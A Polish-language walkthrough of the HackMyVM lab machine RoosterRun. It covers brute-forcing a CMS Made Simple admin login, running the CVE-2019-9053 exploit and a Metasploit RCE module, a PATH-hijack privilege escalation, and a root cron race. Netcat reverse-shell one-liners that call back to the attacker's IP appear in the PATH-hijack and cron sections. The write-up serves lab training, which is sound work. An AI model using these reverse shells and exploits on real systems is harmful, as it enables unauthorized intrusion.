---
title: "RoosterRun - Cromiphi"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Walkthrough
  - HackMyVM
  - RoosterRun
header:
  overlay_image: /assets/images/pasek-hack.png
---
# RoosterRun - cromiphi
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Nazwa:|RoosterRun|
|Autor:|[cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)|
|Wypuszczony:|2023-11-28|
|Ściągnij:|[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=RoosterRun)|
|Poziom:|Łatwy|
|System:|Linux|
|Nauczysz się:|Szybkiego biegania kogutów ;) CVE, RevShell, bruteforce, Sztuczki Bash|

# 01. Wstęp
Kolejna maszynka od **Cromiphi**. Jest to znany twórcy maszynek do łamania, które można znaleźć na **HackMyVM**. To miała być łatwa maszynka, jednak zaliczyłbym ją raczej do średnich. Ma swoje ciekawe momenty, które mogą przystopować na dłużej. Do tego nie jest na parę minut, jakby się mogło komuś wydawać. Jeżeli zaczynasz zabawę z łamananiem, to bez wskazówek możesz się długo z nią męczyć (ale warto). Ip maszyny, jak zwykle wykryłem dzięki programowi **Netdiscover**, ale ostatnio twórcy sami umieszczają adres na ekranie konsoli obrazu.
{: .text-justify}
![01](/assets/images/hacking/2023/05/01.png)
{: .text-justify}
# 02. Co to za maszyna?
Po wstępnym skanowaniu **Nmapem**:
{: .text-justify}
```bash
msf6 > db_nmap 172.16.1.227
# [*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-28 22:20 CET
# [*] Nmap: Nmap scan report for rooSter-Run.lan (172.16.1.227)
# [*] Nmap: Host is up (0.00081s latency).
# [*] Nmap: Not shown: 998 closed tcp ports (reset)
# [*] Nmap: PORT   STATE SERVICE
# [*] Nmap: 22/tcp open  ssh
# [*] Nmap: 80/tcp open  http
# [*] Nmap: MAC Address: 08:00:27:82:3B:50 (Oracle VirtualBox virtual NIC)
# [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
msf6 > hosts 

# Hosts
# =====

# address       mac                name             os_name  os_flavor  os_sp  purpose  info  comments
# -------       ---                ----             -------  ---------  -----  -------  ----  --------
# 172.16.1.227  08:00:27:82:3b:50  rooSter-Run.lan  Unknown                    device
```
widzimy, że mamy otwarte porty: 
{: .text-justify}
- **22/tcp** - SSH
- **80/tcp** - Apache WWW

Czyli standard. Wchodząc przez przeglądarkę jest jakiś CMS - [CMS - Made simple](http://www.cmsmadesimple.org/). Trochę połaziłem po stronie, ale nic ciekawego nie było, co by się potem przydało. **Feroxbuster** i **Dirsearch** wyrzuciły dużo linków, ale znalazły mało przydatnych rzeczy (no, może poza linkiem do logowania i wersją CMS-a). A to też jest ważna wskazówka (że prawie nic się nie znaleziono). Później poszukałem na necie i zobaczyłem, że główny użytkownik to _admin_(jak zwykle :smiley: ). Logowanie typu _admin/admin_ itp. oczywiście nie działało, więc trzeba było inaczej znaleźć hasełko.
{: .text-justify}
![02](/assets/images/hacking/2023/05/02.png)
{: .text-justify}
# 03. Szukanie hasełka dla admina
## 03a. (bruteforce)
Do łamania haseł online dobry jest **Ffuf** i **Wfuzz**. Niestety w **Ffuf** trzeba podawać jakieś dodatkowe parametry nagłówka, żeby dobrze znajdował. **Wfuzz** tego problemu już nie ma. Dodatkowa komplikacja w maszynie jest z umieszczeniem hasła na dalekiej pozycji.(używałem _rockyou.txt_), więc trochę czasu minie zanim program je znajdzie. 
{: .text-justify}
```bash
wfuzz -w /usr/share/wordlists/rockyou.txt -d 'username=admin&password=FUZZ&loginsubmit=Submit' -u http://172.16.1.227/admin/login.php --hh 4569
```
```bash
# /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
# ********************************************************
# * Wfuzz 3.1.0 - The Web Fuzzer                         *
# ********************************************************

# Target: http://172.16.1.227/admin/login.php
# Total requests: 14344392

# =====================================================================
# ID           Response   Lines    Word       Chars       #Payload                                                                              
# =====================================================================

# 000019993:   302        0 L      0 W        0 Ch        
# "hasełko"
```
## 03b. CVE-2019-9053
Wcześniej znalazłem exploit **CVE-2019-9053**, ale mi się nie uruchomił. Powodem był brak biblioteki **Termcolor** do Pythona 2 (w którym uruchamia się skrypt). Niestety Python 2 powoli wychodzi z użycia, ale stare exploity zostały. Poprawiłem to (skopiowałem plik _termcolor.py_ z katalogu _/usr/lib/python3/dist-packages_ do _/usr/lib/python2_) i odpaliłem skrypt z ciekawości. Poniżej pokazuje jak go znalazłem i jego efekty działania.
{: .text-justify}
```bash
searchsploit cms made simple sql
```
```bash
# -------------------------------------------------------------------------------------------------------------------- ---------------------------------
# Exploit Title                                                                                                      |  Path
# -------------------------------------------------------------------------------------------------------------------- ---------------------------------
# CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                              | php/webapps/29941.txt
# CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                | php/webapps/4810.txt
# CMS Made Simple < 2.2.10 - SQL Injection                                                                            | php/webapps/46635.py
```
```bash
python2 46635.py -u http://172.16.1.227/ --crack -w /usr/share/wordlists/rockyou.txt
```
```bash
# [+] Salt for password found: 1a0112229fbd699d
# [+] Username found: admin
# [+] Email found: admin@localhost.com
# [+] Password found: 4f943036486b9ad48890b2efbf7735a8
# [+] Password cracked: hasełko
```
# 04. Podatna wersja CMS Made Simple
Jak wcześniej napisałem jest to **CMS Made Simple**, a jego wersja to **2.2.9.1**. Szukając następnych podatności, tym razem już w **Metasploicie** znalazłem coś takiego:
{: .text-justify}
```bash
msf6 > search CMS Made Simple

# Matching Modules
# ================

#    #  Name                                           Disclosure Date  Rank       Check  Description
#    -  ----                                           ---------------  ----       -----  -----------
#    0  exploit/multi/http/cmsms_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple (CMSMS) Showtime2 File Upload RCE
#    1  exploit/multi/http/cmsms_upload_rename_rce     2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
#    2  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/cmsms_object_injection_rce
```
Wybieramy **multi/http/cmsms_object_injection_rce**:
```bash
msf6 exploit(multi/http/cmsms_object_injection_rce) > set username admin
# username => admin
msf6 exploit(multi/http/cmsms_object_injection_rce) > set password hasełko
# password => hasełko
msf6 exploit(multi/http/cmsms_object_injection_rce) > set rhosts 172.16.1.227
# rhosts => 172.16.1.227
msf6 exploit(multi/http/cmsms_object_injection_rce) > run -j
# [*] Exploit running as background job 0.
# [*] Exploit completed, but no session was created.

# [*] Started reverse TCP handler on 172.16.1.89:4444 
# msf6 exploit(multi/http/cmsms_object_injection_rce) > [*] Running automatic check ("set AutoCheck false" to disable)
# [+] The target appears to be vulnerable.
# [*] Sending stage (39927 bytes) to 172.16.1.227
# [+] Deleted zEAhHHutjN.php
# [*] Meterpreter session 1 opened (172.16.1.89:4444 -> 172.16.1.227:41228) at 2023-11-28 23:06:33 +0100
```
W w/w eksploicie jest wymagane podania loginu i hasła, ale za to mamy dostęp do **Shella**.
{: .text-justify}
# 05. Użytkownik www-data
Wchodząc na shella działamy na użytkowniku **www-data**, ale jest jeszcze drugi "ludź" w katalogu _/etc/home_ - _matthieu_. Trochę autor powrzucał na maszynę króliczych nor i różnej maści zmyłek, ale ważny jest skrypt _StaleFinder_ i katalog _/usr/local/bin_. Jest on pusty, co nasuwa pewne przypuszczenie. A znalazłem ten katalog za pomocą program **Lse**. Wystarczy ściągnąć i uruchomić.
```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" && chmod 700 lse.sh && ./lse.sh -l 1
```
{: .text-justify}
```bash
# ...
# [!] fst160 Can we write to critical files?................................. nope
# [!] fst170 Can we write to critical directories?........................... nope
# [!] fst180 Can we write to directories from PATH defined in /etc?.......... yes!
# ---
# drwxrwx---+ 2 root root 4096 Nov 28 23:32 /usr/local/bin
# ---
# [!] fst190 Can we read any backup?......................................... nope
# [!] fst200 Are there possible credentials in any shell history file?....... nope
# [!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
# [*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
# ...
```
Przyjrzyjmy się bardziej _/usr/local/bin_:
{: .text-justify}
```bash
getfacl /usr/local/bin
```
```bash
# getfacl: Removing leading '/' from absolute path names
# file: usr/local/bin
# owner: root
# group: root
# user::rwx
# user:www-data:rwx
# user:matthieu:r-x
# group::---
# mask::rwx
# other::---
```
Jak widzimy, użytkownik _www-data_ ma cały dostęp do tego katalogu. Skrypt _StaleFinder_ zaś wygląda tak:
{: .text-justify}
```bash
#!/usr/bin/env bash

for file in ~/*; do
    if [[ -f $file ]]; then
        if [[ ! -s $file ]]; then
            echo "$file is empty."
        fi
        
        if [[ $(find "$file" -mtime +365 -print) ]]; then
            echo "$file hasn't been modified for over a year."
        fi
    fi
done
```
Sprawdźmy kolejność przeszukiwania katalogów przez **Basha**(zakładając, że _matthieu_ ma tak samo):
{: .text-justify}
```bash
www-data@rooSter-Run:/home/matthieu$ echo $PATH
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Zobaczmy gdzie jest **Bash**:
{: .text-justify}
```bash
whereis bash
# bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz
```
Katalog _/usr/bin/_ jest za _/usr/local/bin_, więc jeżeli wrzucimy nasz plik **Bash** do katalogu _/usr/local/bin_ to się uruchomi pierwszy. Zawartość **Basha** jego to oczywiście **Reverse Shell**. 
{: .text-justify}
Zawartość pliku:
{: .text-justify}
```bash
nc -c /bin/bash 172.16.1.89 12345
```
# 05. Użytkownik matthieu
Będąc już na koncie _matthieu_ odpalamy wcześniej pobrany program **Lse**. Znalazł interesujący nas fragment:
{: .text-justify}
![03](/assets/images/hacking/2023/05/03.png)
{: .text-justify}
# 06. Ruster Run
I tu zaczynają się schody, oraz ten **wyścig kogutów**, które zabrały mi troche czasu. Pomógł mi zaś **Ethicrash** i gdzieś widziałem wcześniej podobną sztuczkę na maszynie od **RiJaba1** (niekoniecznie to działało tak samo, ale...), ale po kolei. W katalogu _/opt/maintenance_ mamy skrypt o nazwie _backup.sh_, który jest wykonywany co minutę przez **Crontab** z konta **Roota**.
{: .text-justify}
```bash
#!/bin/bash

PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"


for file in "$PREPROD"/*; do
  if [[ -f $file && "${file##*.}" = "sh" ]]; then
    cp "$file" "$PROD"
  else
    rm -f ${file}
  fi
done

for file in "$PROD"/*; do
  if [[ -f $file && ! -O $file ]]; then
  rm ${file}
  fi
done

/usr/bin/run-parts /opt/maintenance/prod-tasks
```
Z katalogu _/opt/maintenance/pre-prod-tasks_ są przerzucane pliki do katalogu _/opt/maintenance/prod-tasks_, a następnie za pomocą komendy _run-parts_ uruchamiane są wszystkie programy. Wydaje się to proste. Wrzućmy pliki, a skrypt skopiuje z uprawnieniami roota i je wykona. Niestety, skrypt kopiuje tylko pliki z rozszerzeniem _.sh_, a tych plików tutaj nie uruchamia komenda _run-parts_. Będąc w katalogu _/opt/maintenance/prod-tasks_ kopiowałem pliki komendą _cp_, ale plik zmieniał właściciela na _matthieu_, a na tym nam nie zależy. Jednak później spróbowałem komendą mv i... jest sukces. Plik nie zmienił właściciela, był nim _root_, a na roocie można było odpalić kolejną konsolkę. Poniżej jest skrypt który to uruchomi i wrzuci plik _file.sh_ do katalogu _/opt/maintenance/pre-prod-tasks_. Przy okazji odpal u siebie następną konsolkę nasłuchującą. Poniżej skrypt:
{: .text-justify}
```bash
#!/bin/sh
PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"
FILE=file.sh
echo '#!/bin/sh' > $PREPROD/file.sh
echo 'nc -c /bin/sh 172.16.1.89 44444' >> $PREPROD/file.sh
chmod +x $PREPROD/file.sh
```
Później wejdź do katalogu _/opt/maintenance/prod-tasks_ i czekaj aż tam będzie _file.sh_. Następną operacją jest zmiana nazwy komendą _mv file.sh file_. Po niecałej minucie powinieneś mieć dostęp do konta _root_.
{: .text-justify}